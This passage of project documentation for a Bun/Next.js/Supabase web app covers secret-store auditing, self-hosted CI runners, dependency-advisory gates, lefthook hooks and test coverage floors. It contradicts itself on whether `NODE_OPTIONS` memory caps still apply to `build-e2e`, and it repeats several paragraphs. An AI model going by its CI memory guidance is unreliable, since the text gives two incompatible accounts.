[`docs/secrets-and-config.md`](./docs/secrets-and-config.md).

| Store | Declared in | Checked by |
|---|---|---|
| Vercel environment variables | `scripts/vercel-env.mjs` | `scripts/check-vercel-env.mjs` |
| Supabase Edge Function secrets | `supabase/functions/secrets.manifest.mjs` | `scripts/check-edge-secrets.mjs` + `supabase.yml` |
| GitHub Actions secrets + variables | `scripts/ci-env.mjs` | `scripts/check-ci-env.mjs` |
| Supabase Vault | *unused, deliberately* | — |

- **`NEXT_PUBLIC_*` is public by construction** — Next inlines it into the client
  bundle. It belongs in Vercel *Plain* and GitHub *Variables*, never in a Secrets
  store. Two real bugs came from getting this wrong.
- **Vault is the wrong tool here.** Every consumer needs the value at cold start
  without a database round trip. Vault only applies if a Postgres function or
  trigger needs a secret.

### The reconciler, and why it exists

All three checkers above are **offline** — they read source and YAML, so each proves
only that a manifest agrees with the code. None can see a dashboard. A live audit on
2026-09-27 found production drift in *every* category they claim to cover:
`STRIPE_SECRET_KEY`, `STRIPE_WEBHOOK_SECRET` and `APP_URL` unset, so commerce
returned 503; all three `NEXT_PUBLIC_*` values held as GitHub *secrets*, so fork PRs
build against empty config; a `required: true` variable never set; twelve
undeclared, unread secrets in the edge project including a `GITHUB_TOKEN`.

```bash
bun run secrets:audit       # reconcile all four live stores (read-only)
bun run secrets:baseline    # re-accept the current state
bun run vercel:env:sync     # populate Vercel from .env.local (--apply to write)
```

The audit is read-only by construction — no mutation path, because a linter that
can delete a live credential is a liability. It prints the fix command for each
finding. `sync-vercel-env.mjs` is the separate, deliberate counterpart: the audit
decides what *should* be true, the sync applies what it can *source*.

**Only `.env.local` and Vault are readable out.** The Supabase edge secret store
and the GitHub secret store are **write-only by platform design** — `supabase
secrets` has no `get` and returns digests, `gh secret list` returns names. A
value written to either cannot be copied to another store by anyone. Do not
design a rotation or migration that assumes otherwise.

Three properties are load-bearing. Do not "simplify" them away:

1. **An unreadable store is UNKNOWN, never empty.** Measured across all three
   CLIs: a non-zero exit means unauthorized, and exit 0 with zero names means
   genuinely empty. So the *operation's own exit code* is the signal, and
   ambiguously-parsed output is UNKNOWN rather than empty — the same class as the
   `grep '"name": "X"'` bug the `supabase.yml` comment documents.

   There is deliberately **no separate auth preflight**. The first version used
   `vercel whoami` and was wrong: a project-scoped token can read a project's env
   but fails `whoami`, so the preflight reported a readable store as UNKNOWN. A
   safety check that manufactures false negatives is worse than no check, because
   it looks like diligence. Use the least-privileged command the operation
   actually requires.
2. **A committed baseline** (`scripts/secrets-baseline.json`) accepts current drift,
   so a not-yet-clean repository does not sit permanently red — only a **new**
   finding fails. A ratchet, not a wall. Findings are fingerprinted
   `code:store:name`, insensitive to rewording.
3. **`scripts/secrets-registry.mjs`** supplies owner, blast radius and expected
   store — the axes a name list cannot express. It deliberately owns *no names*;
   those stay derived from the three manifests, so there is no fourth list to drift.

`.github/workflows/secret-audit.yml` runs the live reconciliation daily at 04:37 UTC
(not `:00`, when every scheduled workflow competes for the shared runner fleet) and
on demand. Outstanding fixes are listed in
[`docs/secrets-and-config.md`](./docs/secrets-and-config.md#outstanding-remediation-from-the-2026-09-27-live-audit).
Four functions deploy `--no-verify-jwt` and are therefore publicly callable, which
is why an unread credential sitting in the edge store is a finding, not a nit.

**`CRM_BROADCAST_FUNCTION_URL` was set in production on 2026-09-30** as a
non-sensitive Production config var. It takes effect on the next production
deployment; until then, every broadcast still fails safely with "the broadcast
sender is not configured on this deployment" and nothing is queued. Value:
`https://<project-ref>.supabase.co/functions/v1/crm-broadcast-send`. It is a
plain URL, not a credential, and the registry expects it in `vercel-var` — which is the
inverse of the mistake the audit exists to catch, since `vercel env add` stores values as
**Sensitive/Secret** by default. See
[`docs/crm-operations.md`](./docs/crm-operations.md#configuration).

**Setting the variable alone was not the fix and never could have been.**
`crm-broadcast-send` was not in `.github/workflows/supabase.yml`, so the variable
pointed production at a route no pipeline shipped — while `secrets.manifest.mjs` already
marked `RESEND_API_KEY` and `APP_URL` required *for that function*, so the workflow was
asserting secrets for code nothing deployed. It is now deployed by that workflow (JWT
verification on) and probed with the publishable key expecting a 401.

---

## CI configuration (GitHub Actions)

The required set lives in **`scripts/ci-env.mjs`**, and
`scripts/check-ci-env.mjs` diffs it against the workflow files. It runs in the
pre-commit gate, so drift fails at commit time rather than at 3am.

- **The runner host has no Node, and that is deliberate.**
  `scripts/setup-runner.sh` used to install Node 20 "as a fallback for some
  tools"; nothing needed it, and a second runtime beside Bun is how a project
  ends up running under Node in production after a job quietly falls back to
  it. The one Node left on that host is the GitHub Actions runner's *own*
  bundled runtime, which is what executes Node-based actions such as
  `actions/checkout` — it lives inside the runner package and is independent
  of the system Node. Nothing in this repository's workflows uses
  `actions/setup-node`, and no project command can reach the runner's copy.
- **One Node runtime remains, and it is outside the project.** The GitHub
  Actions runner's own bundled copy (above) executes Node-based actions such
  as `actions/checkout`. It lives inside the runner package and is
  independent of the system Node: nothing in this repository's workflows
  uses `actions/setup-node`, and no project command can reach the runner's
  copy.
- **That copy is on Node 24, because the actions are.** The workflow's
  actions were three majors behind — `actions/checkout@v4`,
  `actions/upload-artifact@v4` and `actions/cache@v4` — and every one of them
  targets **Node 20**, which the runners now deprecate:

  > Node.js 20 is deprecated. The following actions target Node.js 20 but are
  > being forced to run on Node.js 24: actions/checkout@v4,
  > actions/upload-artifact@v4.

  The upload action also emitted `punycode` and `url.parse()` deprecation
  warnings from its own code. `checkout` is on **v7**, `upload-artifact` on
  **v7** and `cache` on **v6** now, and every one of them runs on Node 24.
  `upload-artifact@v6` fixed the `punycode` deprecation outright.

  Three things had to be true for the jump to be safe, and all three were
  checked rather than assumed. The **runner** is `2.337.0`, and the Node 24
  majors require `2.327.1` or newer. The workflows set
  `persist-credentials: false` everywhere, which matters because
  `checkout@v6` changed *where* credentials are persisted when they are
  persisted at all. And `checkout@v7` blocks fork checkouts for
  `pull_request_target` and `workflow_run` — neither of which this
  repository's workflows use, since they trigger on `pull_request` and
  `push`.

  The deprecation warnings are gone from the job logs, and the last Node 20
  in the toolchain went with them.
- **Trunk is gone, and it was the only thing on a developer machine that
  pulled a Node runtime.** `.trunk/trunk.yaml` enabled `node@26.8.1`,
  because two of trunk's linters — `markdownlint` and `svgo` — are npm
  packages, and trunk downloads that runtime into its own cache. Trunk was
  not wired into CI or into the lefthook gates (`trunk-check-pre-push` and
  `trunk-fmt-pre-commit` were disabled in favour of lefthook), so it
  downloaded a Node runtime in order to gate nothing. It is removed.
  `scripts/hooks/no-node-runtime.mjs` now has a rule for the shape it took —
  a `node@<version>` runtime declaration in a config file — so the same
  mistake cannot come back through a linter's settings. The distinction
  matters because "no Node anywhere" is the claim the project actually
  makes about *its* runtime, and a linter's interpreter is not the
  project's interpreter.
- **`NODE_OPTIONS` is not a memory control here.** It was, when the build ran
  on V8: `lint` capped at 2048 MB and `build-e2e` at 1280 MB, and both caps
  read like load-bearing safety rails. They were not. Every process in those
  jobs now runs on Bun, and Bun does not read `--max-old-space-size` from
  `NODE_OPTIONS` — measured on Bun 1.4.4, the heap limit is ~48 MB whether
  the variable is 768, 1280, 3584 or absent. The caps were removed with the
  V8 they were protecting. What actually bounds those jobs is
  `experimental.cpus: 1` (serial prerendering) and Playwright's
  `--workers=1`. See [`docs/ci-runners.md`](./docs/ci-runners.md).

- **`NEXT_PUBLIC_*` and `SUPABASE_PROJECT_REF` are repository *variables*, not
  secrets.** Next inlines `NEXT_PUBLIC_*` into the client bundle, so they are
  public by construction. Storing them as secrets also broke `ci.yml`: secrets
  are withheld from `pull_request` runs from forks, and `env.ts`'s `.default()`
  absorbed the empty value, so a fork PR built successfully against placeholder
  credentials.
- **CI waits forever when no runner can take the job, and that is not always a label
  problem.** `runs-on: [self-hosted, linux, <frontend|backend>-runner]` is
  arch-neutral on purpose (2026-10-05): both registered runners carry those
  labels, so either can serve. Do not re-add an `X64`/`ARM64` token to pin jobs
  to one runner. The real runner is `indivisiblefairoaks-runner-1`, a Quadlet container on
  the **ghrunner** host (an x86_64 Linux box over Tailscale) whose labels are
  `self-hosted, Linux, X64, ghrunner, personal, personal-organicnz,
  frontend-runner, backend-runner` — matching its native x86_64 architecture.

  Every job here sat `queued` for weeks because that container never registered.
  Its entrypoint mints a registration token from `api.github.com` before
  starting; with no DNS it failed, so GitHub never saw an X64 runner at all. The
  cause was the podman network: `ghrunner` had DNS enabled, so containers got
  aardvark-dns on `10.89.0.1`, which forwards to the host's systemd-resolved stub
  on `127.0.0.53` — a **loopback-only** address a bridge network cannot reach.
  Recreating the network with `--disable-dns` makes podman inject the real
  upstream itself, and the container registers within seconds.

  **The diagnostic trap is the part worth keeping.** The runners page listed a
  single runner — `personal-organicnz`, a hand-registered ARM64 Mac — and that
  was *accurate* rather than misleading: the real runner was missing because it
  had never registered. "The selector matches no runner" and "the runner does not
  exist" are indistinguishable from the repository, and an ARM64/X64 partial
  overlap looks exactly like a label bug. So never read this from the run list,
  where a queued job and an unservable selector are identical. Ask
  `gh api repos/:owner/:repo/actions/runners -q '.runners[].status'` **and**
  `-q '.runners[].labels[].name'` — and check that the runner you *expect* is on
  that list at all, not merely that its labels match.

  The host is still the ceiling: the container runs with `Memory=1073741824`
  (1024 MiB) and `MemorySwap=4294967296` (4096 MiB, backed by 6 GB host swap),
  so jobs end `cancelled` rather than `failed` once the cgroup is exhausted.
  With the expanded 6 GB host swap, `build-e2e` configures `NODE_OPTIONS: --max-old-space-size=3584`
  to give V8 sufficient room to compile and prerender without thrashing garbage collection
  or failing on "Ineffective mark-compacts". The full record is in [`docs/ci-runners.md`](./docs/ci-runners.md).
- **NEVER switch CI jobs to GitHub-hosted runners (`ubuntu-latest`).** The runner
  fleet is strictly self-hosted rootless Podman containers on our own server (`ghrunner`).
  Never attempt to "fix" slow or failing builds by changing `runs-on` to `ubuntu-latest`.
  Instead, observe the memory and concurrency contract:
  1. **Memory (`NODE_OPTIONS`)**: With the host's expanded 6 GB swap (`MEMORY_SWAP=4096M`
     on `ghrunner`), `build-e2e` sets `NODE_OPTIONS: --max-old-space-size=3584` to give V8
     room to compile and prerender without thrashing garbage collection cycles.
  2. **Next.js static page generation**: In `next.config.ts`, `isE2EBuild` must configure
     `experimental.cpus: 1` and `staticPageGenerationTimeout: 180` (or higher).
     The default 60s timeout triggers retry spirals (3 retries × dozens of pages)
     when static rendering touches swap, and multiple workers fight for RAM. 1 worker
     prerenders all 66 static pages cleanly in ~1.5 seconds.
  3. **Playwright worker limit**: Pass `--workers=1` in CI (or rely on `playwright.config.ts`'s
     `workers: 1` in CI) to prevent multiple concurrent Chromium instances from fighting
     against Next.js (`next start`) and the mock server for memory.
- **The local lefthook gates are therefore the real gates**, and they do run on
  every push: 35 pre-commit guards, then lint → unit → coverage → types → build →
  peer-deps → 95 Playwright specs (95 + no running tests). Migrations and Edge Functions are **not**
  deployed by hand: `supabase.yml` is the only delivery path and a push touching
  `supabase/**` is its trigger, so the fix and the deploy are one action. It pushed
  migrations to the hosted project at 20:56 on 2026-10-04 while its sibling
  `deploy` job failed on a type error — so after any partial failure, check whether
  schema moved before re-running. See
  [`docs/ci-runners.md`](./docs/ci-runners.md#migrations-and-edge-functions-ship-through-supabaseyml).
- **Every workflow declares an explicit `permissions:` block.** Two that hold
  credentials previously inherited the repository default, which may grant
  write.
- `SUPABASE_SECRET_KEY` bypasses RLS entirely. It is scoped to one scheduled
  workflow; a leak makes the row-level security model decorative.
- Full inventory and rationale: [`docs/ci-secrets.md`](./docs/ci-secrets.md).
- All four stores together: [`docs/secrets-and-config.md`](./docs/secrets-and-config.md).

## Dependency vulnerabilities

`bun audit` is the Bun-native equivalent of `npm audit`, and it is the only
thing in this repository that makes "a package with a known CVE" — coding
rule 7 — computable rather than aspirational. `bun run audit:deps`
(`scripts/check-vulnerabilities.mjs`) runs it in CI.

**It is a ratchet, not a wall.** The tree cannot be advisory-free today, and
a permanently-red gate is not a gate. So the accepted set lives in
`scripts/vulnerabilities-baseline.json`, one entry per advisory, **each with
the reason it was accepted** — and the gate fails in both directions: a new
advisory fails, *and* a baselined advisory that has stopped applying fails,
so a fix has to delete its own excuse rather than leave a stale one behind.
This is the same shape as `scripts/data-points-baseline.json` and
`scripts/secrets-baseline.json`, for the same reason.

**An advisory database that cannot be read is UNKNOWN, never clean.** The
default is to report UNKNOWN and continue, because a network outage is not a
defect in this repository; `--strict` turns it into a failure. The output
says UNKNOWN either way, so it is never mistaken for a pass.

**The baseline went from 75 advisories to 1**, and the shape of the work is
worth recording because it is not the shape you expect:

- **`next` 16.3.2 → 16.3.8** carried three *critical* advisories. `bun audit
  fix` bumped the pin; the repo pins `next` exactly, so that is a deliberate
  pin bump and the build and the full suite were re-run against it.
- **Most of the rest were inside the `vercel` CLI's dependency tree** — a
  devDependency, not shipped code, whose vulnerable paths (TOML/YAML
  parsing, schema validation, path matching) this repository does not
  exercise. The fixes needed *major* bumps against packages pinned to an
  exact version, which is where a naive fix breaks the tool.
- **Bun's `overrides` support nested scope**, which is what made the
  dangerous ones safe: `"@vercel/node": { "undici": "6.28.1" }` moves that
  one subtree without dragging every other copy of `undici` with it. A flat
  `overrides` entry for `minimatch` would have forced the 3.x copy to 10.x.
- **The Vercel CLI was verified end to end afterwards** — `vercel whoami`
  against the live API, under Bun — because "the CLI still starts" is not
  evidence that its HTTP stack still works.

**One more arrived later, and it was the only one in a *shipped* dependency.**
`vgpu` — a runtime dependency, for the WebGPU components — pins
`@modelcontextprotocol/server` at exactly `2.0.0`, and three advisories
landed against it: two `high` (a shared transport delivering one HTTP
client's messages to another; a single request exhausting server memory
during validation) and one `moderate` (bearer authentication accepting tokens
issued for another service). All three are fixed in `2.3.0`.

The fix is the nested-scope override the same section documents:

```json
"overrides": {
  "vgpu": { "@modelcontextprotocol/server": "2.3.1" }
}
```

`2.3.1` rather than `2.3.0` because it is the latest patch of the fixed
line, and it is a **minor** bump within the same major, so the MCP SDK's
surface is unchanged. The scope matters: `vgpu` is the only package that
depends on the MCP server, and a *flat* override would have applied to every
copy of it in the tree.

The MCP SDK is vgpu's dev-facing tooling; the browser bundle uses
`@vgpu/core` and `@vgpu/wgsl`, so the vulnerable code is not shipped to a
visitor. That is a reason to fix it rather than accept it — the SDK runs on
the server, where a shared transport is exactly the kind of thing that gets
exercised — and it is not a reason to leave it. The build and the full e2e
suite (which exercise the five vgpu components) were re-run against the
override.

**The one advisory that remains has no fix.** `braces@3.0.3` is the latest
published version, so there is nothing to pin to; it is reachable only
through `ts-morph` inside the `vercel` tree, and the related
`brace-expansion` advisory in the same subtree *did* have a fix and was
resolved. It is in the baseline with that reason attached.

**The shipped tree is a second, independent gate — and it has no baseline.**
The baseline is a *whole-tree* ratchet, and the reason recorded against the
accepted advisory is a **manual claim about reachability**: "reachable only
through `ts-morph` inside the `vercel` CLI's tree, which is a devDependency
and is not shipped". A manual claim is exactly the kind of thing that stops
being true without anyone noticing — and the baseline is keyed on the GHSA
id, so it knows nothing about which packages ship. Promote `vercel` to a
runtime dependency and the baseline would still accept it.

So `scripts/check-vulnerabilities.mjs` makes **two** statements, from two
different computations:

| Gate | Computation | Tolerance |
|---|---|---|
| The whole tree | `bun audit --json` | A ratchet against the baseline: new fails, stale fails. |
| The **shipped** tree | `bun audit --production --json` | **Zero.** No baseline, no exceptions. |

`bun audit --production` computes the second set itself, from the dependency
graph, rather than from a claim in a JSON file. It reports "No
vulnerabilities found (checked 250 packages)" against 804 installed — so the
one accepted advisory really is dev-only, and that is now a *measured* fact.

**Verified by injection:** adding `braces@3.0.3` to `dependencies` — a
package the baseline *accepts* — makes the whole-tree half pass and the
production half fail. The scenario the baseline alone could not catch is the
one the second gate catches.

### Supabase Edge Function secrets — a *separate* store

`supabase functions deploy` ships **code only**. `supabase.yml` never runs
`supabase secrets set`, so these values are set by hand in the dashboard and CI
could not see them. The `verify` job's probes all fail on a validation or method
check that runs *before* any secret is read, so a missing `STRIPE_SECRET_KEY`
deployed green and broke silently.

- `supabase/functions/secrets.manifest.mjs` declares what each function needs;
  `scripts/check-edge-secrets.mjs` (pre-commit) keeps it in sync with the code and
  with `env.example.md`, and `supabase.yml` asserts the required ones are actually
  set in the hosted project.
- Platform-injected (`SUPABASE_URL`, `SUPABASE_ANON_KEY`,
  `SUPABASE_SERVICE_ROLE_KEY`) are absent from `secrets list` by design — do not
  add them to the required list.
- **`APP_URL` currently defaults to the apex, which 302s to Google Sites.** WALL-E
  citations and Stripe return URLs therefore point somewhere that does not serve
  the app. It must be set to the staging host now and the apex at cutover.
- **Supabase Vault is not used.** Environment injection is correct at this size —
  every consumer is an edge function here and needs the value at cold start. Vault
  earns its place only when a Postgres function or trigger needs a secret.
- The edge `checkout` function carried the **entire NZD bug** independently of the
  Next app and was directly reachable. `src/lib/__tests__/commerce-parity.test.ts`
  now asserts `_shared/commerce.ts` and `src/config/commerce.ts` agree.

---

## Delivery Gates (lefthook)

- **pre-commit**: secrets, migration guards, RLS/SECURITY DEFINER, Biome, oxlint, typecheck, env contracts (local `.env`, the GitHub Actions inventory, and the secrets registry in `--offline` mode — no network, because a hook that needs a token is a hook that gets bypassed), lockfile pairing, data-points seed↔reader↔fallback consistency (`scripts/check-data-points.mjs` — a seed nobody reads, a read nobody seeds, and a wired fallback that disagrees with its seed all fail, with accepted findings annotated in `scripts/data-points-baseline.json`, and that ratchet only shrinks), documentation numeric claims (`scripts/check-doc-claims.mjs` re-derives guard counts, the suppression baseline, `lefthook.yml`'s length, spec totals and the two coverage floors from their sources of truth), the no-Node-runtime guard (`scripts/hooks/no-node-runtime.mjs` — a Node shebang, a second package manager or a `setup-node` step works on a laptop with Node installed and breaks on every runner this project has; and a local binary invoked as `bun <bin>` rather than `bun --bun <bin>`, which hands the program to Node.js wherever Node.js is installed and to Bun only where it is not — the same divergence, wearing a different hat. The rule reads the local bin set out of `node_modules/.bin`, so a dependency that arrives tomorrow is covered without the guard being edited. CI runs it over the **whole tree** with `--all`, not just the staged subset, so a violation that arrived by a merge is caught too), the test-environment guard (`scripts/hooks/vitest-environment.mjs` — **every** test file must declare its Vitest environment on its first line, because Vitest constructs an environment per file and jsdom's construction was 63% of the unit suite's time; the guard also requires the `node` environment on any test that reaches for `Bun.*`, directly or through an imported script, because Vitest's `jsdom` environment replaces the worker's global with the jsdom window's and the `Bun` global does not survive that swap on every platform), and `playwright test --list` when `e2e/**` changes (spec parse only — no browser launch).
- **`lefthook.yml` is 626 lines of wiring; the logic is in `scripts/hooks/*.mjs`.** Every
  guard that was a `run: |` bash block is now a `bun scripts/hooks/<name>.mjs` call, and
  its rationale comment moved into that file's header — where it sits beside the code it
  explains rather than four hundred lines above it. `lefthook.yml` keeps what only it can
  know: the `glob` that decides when a guard runs, its `priority`, and the staged-file
  arguments. The number above is re-derived from the file on every commit, so it cannot
  drift silently. Two things stayed inline deliberately: the `suppress-count` gate, because
  its `BASELINE=12` is what `check-doc-claims.mjs` parses, and the eight guards that were
  already one-line `bun scripts/check-*.mjs` calls. **Adding a guard means adding a file
  under `scripts/hooks/`, not writing bash in YAML.**
- **pre-push**: lint → unit → typecheck → production build → peer-deps → **Playwright e2e delivery gate** (full suite, `workers=2`) when the push range touches `src/`, `e2e/`, `public/`, `supabase/`, app configs, or the lockfile. Docs-only pushes skip e2e with an explicit note.

### The e2e suite must be pointed at *this* build — and it now proves it

`reuseExistingServer` means a local run reuses whatever is already listening
on the port instead of starting its own. That is a reasonable convenience,
and it is also a way for the suite to drive **the wrong application** without
saying so.

**It happened here.** Another Next.js app on the same machine was listening on
the e2e port; Playwright reused it; the suite drove it; and the first thing
that failed was `waiting for locator('#auth-tab-password')` — an element the
*other* application does not have. The error named a locator and said nothing
about the fact that the entire suite was pointed at a different product.
Ninety-four tests "did not run", and the report read like a product
regression.

The page snapshot gave it away: the other app's name, in the header.

Three things now prevent it:

| Change | What it does |
|---|---|
| `e2e/global-setup.ts` | **Proves the server under test is this build.** Next writes the build id into the RSC flight payload as the segment's `b` field, so one marker answers both questions that matter: *which* application is answering, and *which* build of it. A stale server fails the same way a foreign one does. |
| `e2e/helpers/ports.ts` | **One source of truth for the ports.** `playwright.config.ts`, `e2e/contact.spec.ts` and `e2e/instant.spec.ts` all need them, and they each hard-coded `3100`/`3101` — three copies of a port, and the one nobody remembered to move. `E2E_PORT` overrides them together. |

The global setup **fails rather than starting its own server** — it cannot,
the port is occupied, which is the whole reason the foreign server was
reached. So the honest outcome is a failure that names the cause, which is
the difference between a diagnosis and a symptom.

**One subtlety worth keeping:** the build id is read from the flight
payload's `b` field, not by searching the page for the id as a substring. A
page that merely *mentions* the id would satisfy a bare search, and this is a
check about the server's identity. The payload's quotes arrive escaped
(`\"b\":\"<id>\"`) because it is embedded in a `<script>` as a JSON string, so
the escaping is undone first.

**And a dead guard, found on the way.** The commit-time spec-parse hook's
glob was `e2e/**/*.spec.ts`. lefthook matches with gobwas/glob, where `**/`
means *one or more directory levels* — so that pattern does **not** match
`e2e/contact.spec.ts`. Every spec in this repository sits directly in
`e2e/`, so **the glob matched nothing and the hook had been dead since it
was written**: a guard that reported success while measuring nothing.
Verified with lefthook's own matcher:

```
$ lefthook run pre-commit --file e2e/contact.spec.ts
│  old (skip) no matching staged files
```

It is now two globs — `e2e/*.{ts,tsx}` for the files directly in `e2e/` and
`e2e/**/*.{ts,tsx}` for the ones below it — because `**/` cannot express
"zero or more levels" on its own. The scope is the whole `e2e/` TypeScript
rather than just the specs, because `e2e/helpers/ports.ts` is imported by the
specs and a syntax error in it is a spec that cannot be listed.
`e2e/global-setup.ts` is the exception: Playwright does not load the global
setup at `--list` time, so that file is covered by the type check instead
(`tsconfig.json`'s `include` is `**/*.ts`).

- **The coverage gate is per-file, not a global percentage, and that is deliberate.**
  Vitest's bare `statements: 90` is checked against the *aggregate* over every included
  file, so a stricter file cannot raise it and a looser one silently lowers it for
  everything else. `vitest.config.mts` therefore names globs: 90 across the board, with
  `src/lib/actions/crm.ts` on an explicit floor of **89 / 85 / 100 / 93** and
  `src/lib/actions/content.ts` on **65 / 57 / 70 / 70** (raised 2026-10-12 with the
  first `getContentList` suite; was **58 / 54 / 61 / 65**). Both were in **no threshold
  at all** until recently — neither was in the `include` list — which is how a
  ceiling refusal stayed dead code and a `created_by` column stayed unwritten with
  the pipeline green. Their remaining uncovered branches are `?? 0` / `?? 'draft'`
  defences against `NOT NULL` columns. A floor is a ratchet, not an exemption: it can
  only go up.
- **The coverage measurement depends on the Bun version, and the floors have
  to rest on tests rather than on the instrument.**
  Bun's v8 coverage changed how it counts a **never-taken fallback**: the
  older canary counted `value ?? fallback` as covered when only the left
  side was taken, and the newer canary counts it as uncovered. Measured on
  the same tree, the same tests:

  | | Bun `6bb5dc195` | Bun `9b4284f7` |
  |---|---|---|
  | `crm.ts` branches | 93.07% | **84.91%** |
  | the thresholded set | 92% | 87% |

  The newer numbers are the *accurate* ones: a fallback nobody exercises is
  not coverage. And the floors had been satisfied partly by the old
  instrument's over-reporting — so the gate had been failing on CI since the
  canary moved, masked by the `Bun is not defined` failure that the
  `--bun` fix removed. It surfaced as
  `Coverage for branches (84.91%) does not meet "src/lib/actions/crm.ts"
  threshold (85%)`.

  The response was to **test the gap, not to lower the floor**. The
  fallbacks that a caller can actually reach — the media library's defaults
  for a row with no metadata, the directory query with no filter, the
  health probe answering with a body it does not recognise, a file whose name
  reduces to nothing — are now exercised by new tests. `crm.ts` went from
  84.91% to **86%** and the floors are unchanged.

  What is left uncovered in `crm.ts` is mostly **error paths** — `if (error)
  return { success: false, error: error.message }` and its neighbours — and
  those are a real gap the floor deliberately allows at 85%, not something to
  annotate away. `/* v8 ignore next */` is available for a branch that is
  genuinely unreachable, and it makes the measurement identical under both
  Buns — but it also removes the branch from the denominator, so it is a
  statement about the code rather than a way to make a number.

  The rule this leaves behind is the one the repository already applied to
  `tsrs`: **a gate's output must not depend on a moving toolchain**, and
  when it does move, the gap is a gap in the *tests*. `/* v8 ignore next */`
  is available for a branch that is genuinely unreachable, and it makes the
  measurement identical under both Buns — but it also removes the branch
  from the denominator, so it is a statement about the code rather than a
  way to make a number.
- **Two exclusion globs do not compose; write one.** Vitest treats each threshold key
  as its own "everything except this" set, so naming `'!crm.ts'` and
  `'!content.ts'` separately makes each one *include* the other file, and each set
  then fails on the other's floor. The exclusion has to be a single
  `'!src/lib/actions/{crm,content}.ts'`.
- **Adding a file to `include` can turn the gate red without touching anything else.**
  The same aggregate arithmetic is why. `src/lib/image-size.ts` entered at 86% branches
  and pulled everything-except-`crm.ts` from 90.0% to 89.86% — the build failed on
  coverage alone, with 895 tests green. The fix is to cover the new file, never to
  widen an exclusion to accommodate it: the whole point of naming globs is that a
  file in the list is a file being measured.
- **A gate that is sometimes red is not a gate.** The `blocks.test.ts` property
  suite (four properties × 300 generated documents, up to three serialize → parse →
  sanitize cycles each) sat right at Vitest's 5s default once `v8` instrumentation
  was on, and failed *intermittently* under `test:coverage` — pass or fail depending
  on machine load. That trains people to re-run until green, which is how a real
  regression gets through. The budget is now stated per suite
  (`PROPERTY_TIMEOUT_MS`) with the run count and every assertion untouched; raising
  `testTimeout` globally would have hidden the same cost everywhere else.
- **A mock narrower than the real client fails on correct code.** Five suites
  hand-rolled their own `adminClient`, each modelling the smallest slice it needed.
  `saveContent` legitimately calls `.update().eq().select().maybeSingle()` — the
  shape PostgREST requires to report whether an UPDATE matched a row at all — while
  `content-revisions`' `update()` returned `{ eq: () => Promise.resolve(...) }`, so
  correct code failed a green suite. `src/lib/__tests__/supabase-mock.ts` is the
  shared row-based replacement, and **all eight action suites now use it**: the
  three CRM suites were converted, so nothing asserts on call *arguments* any
  more. The conversion was worth its cost immediately — it found four places
  where the shared mock was wrong rather than merely narrow:

  - `.in()` and `.neq()` matched a **null** row. PostgREST's `in.(null,…)` still
    matches the non-null entries but never the null one, and `s <> 'active'` is
    UNKNOWN rather than true when `s` is null. Both are now excluded, and
    `supabase-mock.test.ts` pins it.
  - A **chunked insert** answered with a single row. PostgREST returns an array
    from an insert with `RETURNING`, so the CSV importer's `(created || []).map(…)`
    hit `map is not a function` on a correct caller.
  - A **`DELETE … RETURNING`** answered `data: null` unconditionally. supabase-js
    sends `Prefer: return=representation` for `.delete().select(…)`, and
    `deleteCRMTask` depends on the deleted row, so the action reported failure
    for a delete that had worked.
  - The builder was **not a `PromiseLike`**, so a test could not `await` one
    without a cast.

  The mock still deliberately does **not** model `.or()`, `.contains()` or
  `.textSearch()`: those are PostgREST query-string languages, and reproducing
  them means reimplementing PostgREST's parser. A test reaching one must declare
  `filterRows` — the rows that filter actually selects — and reaching one without
  declaring it returns **no rows**, so the omission fails loudly instead of
  passing. The handful of tests about a filter *string's contents*
  (search-term sanitisation) record the arguments via `{ recordFilters: true }`
  alongside the rows, because a string that would produce a 400 satisfies every
  assertion about rows.

  **One thing a row-based mock cannot show is pinned explicitly.** Deleting the
  `.order('id', …)` from `resolveBroadcastRecipients` — the fix for a contact
  being mailed twice across a page boundary — fails nothing about rows, because
  the resolved audience never leaves the resolver and a count is identical either
  way. `crm.test.ts` asserts it through `orderCalls` for that reason. Mutating
  the source to delete that `.order()` fails that test and no other in the file,
  which is the evidence it is doing the job no row assertion could.
- Bypasses (documented in `lefthook.yml`): `LEFTHOOK=0`, `LEFTHOOK_EXCLUDE=<command>`.

---

## Deferred Upgrades

### TypeScript 7 — DONE, and it needed Next.js 16.4

It was blocked for a year, and the block was real: Next.js 16.3 loads
TypeScript through the JS compiler API (`lib/typescript.js`), and TypeScript 7
removed that file — TS 7 is the native (Go) compiler and ships a `tsc`
**binary**, not an API. Tracking: [vercel/next.js#95633](https://github.com/vercel/next.js/issues/95633).

**Next.js 16.4 enabled the shim architecture.** It ships `experimental.useTypeScriptCli`,
which runs the `tsc` binary instead of the API, resolving that binary from
the `typescript` package's `bin` metadata. Through `tools/typescript-shim/`,
this `tsc` binary delegates directly to native `tsrs` (the Rust port of TypeScript 7)
while answering `--showConfig` locally. `next.config.ts` sets it, with the
reasoning inline.

The spawn uses `process.execPath`, which under `bun --bun next build` is the bun
binary. So the type check that runs inside the build runs on **Bun** through
`tsrs`, in a project with no Node.js and no secondary compiler.

**The `tsconfig.json` needed no changes.** It was already shaped for TS 7
(`moduleResolution: bundler`), and the build does not rewrite it —
verified by diffing before and after a full build.

**The project exclusively runs `tsrs` for TypeScript 7.** `tsrs` (the native
Rust compiler port) is the sole type-check gate in CI, pre-commit, and the
Next.js build shim. See "The runtime is Bun" for the details.

**TypeScript 6 was never worth having** — a bridge release of deprecations
only — and it is now moot.

---

## Known Follow-ups

Deliberately left undone. None block the apex cutover.

1. **The dark civic pages keep their gradient stops.** ~690 raw palette classes
   were swept to tokens and verified pixel-identical (`scripts/token-sweep.mjs`).
   What remains are the atmospheric `from-`/`via-`/`to-` gradient stops and a
   handful of `indigo-*`/`emerald-*` status tints, which have no token equivalent.
   Collapsing them would flatten a deliberate design choice, so they stay.
2. **Apex SPF does not authorise Resend.** Application mail passes DMARC on
   Resend DKIM alignment alone. `_spf.resend.com` is NXDOMAIN, so adding that
   `include` would make the whole record a `permerror`. Resolving this is a
   decision, not a mechanical fix — see the recovery log §8.
3. **`google._domainkey` is unpublished**, so outbound Workspace mail fails DKIM.
4. **Shipping rates are placeholders** inherited from the previous site's New
   Zealand tariff. See `src/config/commerce.ts`.
5. **HSTS `preload` + `includeSubDomains`** pins every subdomain to HTTPS for
   ~12 months once submitted, including staging.
6. **Existing CRM tags are not lowercased.** Every write boundary now
   normalises — contact schema, segment schema, broadcast audiences, merge,
   and the filter parser all run through `normalizeTags` — but rows written
   before that fix still hold `Choir` next to `choir`. The remainder is the
   one-time `UPDATE … lower(tags)`, a data change that belongs to the chapter,
   not to a deploy.
